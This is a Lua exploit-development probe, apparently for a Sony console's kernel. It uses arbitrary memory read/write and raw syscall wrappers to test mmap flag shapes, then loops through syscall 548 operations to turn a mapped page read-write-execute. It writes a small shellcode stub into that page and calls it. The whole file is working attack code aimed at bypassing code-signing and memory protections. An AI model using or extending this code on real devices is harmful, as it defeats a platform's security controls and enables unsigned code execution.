-- CRASH_CLASS: HIGH
-- PROBE 803c: establish the mmap shape that works, then try 548's protect op on it
--
-- 803b never reached the 548 test because mmap(PROT_NONE) returns -1 here; Sony's mmap wants
-- the 0x30 flag bits that the repo's own GPU example uses (0x33 = PROT_READ|PROT_WRITE|0x30).
-- This probe first finds a mapping the loader can actually make, then runs every 548 op with
-- prot=7 and reads the protection back from sys 674.  If a page reaches prot 7 it writes
-- `mov eax, 0x1337; ret` and calls it.

print("=== PROBE 803c: MMAP SHAPES, THEN 548 PROTECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wrb(a, v) return pcall(function() memory.write_byte(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function split(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function ascii(a, n)
    local out = ""
    for i = 0, n - 1 do
        local b = (rd(a + i) or 0) % 256
        if b == 0 then break end
        if b >= 32 and b < 127 then out = out .. string.char(b) else out = out .. "." end
    end
    return out
end

local getpid = make_syscall(20)
local sc674 = make_syscall(674)
local sc_mmap = make_syscall(477)
local sc548 = make_syscall(548)
local sc_munmap = make_syscall(73)
pcall(function() return getpid() end)

local STRIDE, MAX = 72, 512
local regions = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, 0x400, 4 do wd(regions + i, 0) end
local countp = memory.alloc(16)

local function region_of(va)
    wq(countp, uint64(0))
    local ok = pcall(function()
        return sc674(uint64(regions), uint64(STRIDE), uint64(MAX), uint64(countp), uint64(0x40000000))
    end)
    if not ok then return nil end
    local n = rd(countp) or 0
    if n > MAX then n = MAX end
    for i = 0, n - 1 do
        local b = regions + i * STRIDE
        local lo = (rd(b) or 0) + (rd(b + 4) or 0) * 4294967296
        local hi = (rd(b + 8) or 0) + (rd(b + 12) or 0) * 4294967296
        if va >= lo and va < hi then
            return lo, hi, rd(b + 0x18) or 0, ascii(b + 0x20, 0x18)
        end
    end
    return nil
end

local recs = memory.alloc(0x20 * 8)
local function batch(addr, payload, len, prot, op)
    local b = recs
    wq(b, split(0, addr))
    wq(b + 8, split(0, payload))
    wq(b + 0x10, split(0, len))
    wd(b + 0x18, prot)
    wd(b + 0x1c, op)
    local ok, rv = pcall(function()
        return sc548(uint64(0), uint64(0), uint64(recs), uint64(1), uint64(0))
    end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end

print("[A] mmap shapes (addr, len, prot, flags, fd, off)")
local shapes = {
    {"anon rwx 0x33",      0,          0x4000, 0x33, 0x1002, 0xFFFFFFFF, 0},
    {"anon 0x30",          0,          0x4000, 0x30, 0x1002, 0xFFFFFFFF, 0},
    {"anon rw 3",          0,          0x4000, 0x03, 0x1002, 0xFFFFFFFF, 0},
    {"anon none 0",        0,          0x4000, 0x00, 0x1002, 0xFFFFFFFF, 0},
    {"fixed rwx 0x33",     0x700000000,0x4000, 0x33, 0x1012, 0xFFFFFFFF, 0},
    {"fixed rw 3",         0x700000000,0x4000, 0x03, 0x1012, 0xFFFFFFFF, 0},
}
local TARGET = nil
for _, s in ipairs(shapes) do
    local ok, rv = pcall(function()
        return sc_mmap(uint64(s[2]), uint64(s[3]), uint64(s[4]), uint64(s[5]),
            uint64(s[6]), uint64(s[7]))
    end)
    local r = ok and to_num(rv) or -999
    local line = string.format("  %-18s prot=%02X flags=%X ret=%s", s[1], s[4], s[5], tostring(r))
    if ok and r >= 0 then
        local lo, hi, p, nm = region_of(r)
        if lo then
            line = line .. string.format(" -> [%X,%X) prot=%X %s", lo, hi, p, nm)
            if not TARGET then TARGET = r; print(line .. "  *") else print(line) end
        else
            line = line .. " -> no region"
            print(line)
        end
    else
        print(line)
    end
end

if not TARGET then
    print("")
    print("[Z] no mmap shape worked; stopping")
    return
end

print("")
print(string.format("[B] target page = %X", TARGET))
local _, _, p_start = region_of(TARGET)
print(string.format("  start prot=%X", tostring(p_start)))

print("")
print("[C] 548 op matrix, prot=7")
for op = 0, 4 do
    local r = batch(TARGET, 0, 0x4000, 7, op)
    local lo, hi, p, nm = region_of(TARGET)
    print(string.format("  op=%d ret=%s prot=%s %s", op, tostring(r),
        tostring(p), nm or ""))
    if p == 7 then
        print("  *** RWX via op " .. op .. " ***")
        local code = {0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3}
        for i, b in ipairs(code) do wrb(TARGET + i - 1, b) end
        print(string.format("  bytes: %02X %02X %02X %02X %02X %02X",
            rd(TARGET) % 256, rd(TARGET + 1) % 256, rd(TARGET + 2) % 256,
            rd(TARGET + 3) % 256, rd(TARGET + 4) % 256, rd(TARGET + 5) % 256))
        local okc, val = pcall(function()
            return native.fcall_with_rax(uint64(TARGET), 0)
        end)
        print("  call ok=" .. tostring(okc) .. " ret=" .. tostring(okc and to_num(val) or "-"))
        if okc and to_num(val) == 0x1337 then print("  *** SHELLCODE EXECUTED ***") end
        break
    end
end

print("")
print("[D] alive pid=" .. to_num(getpid()))
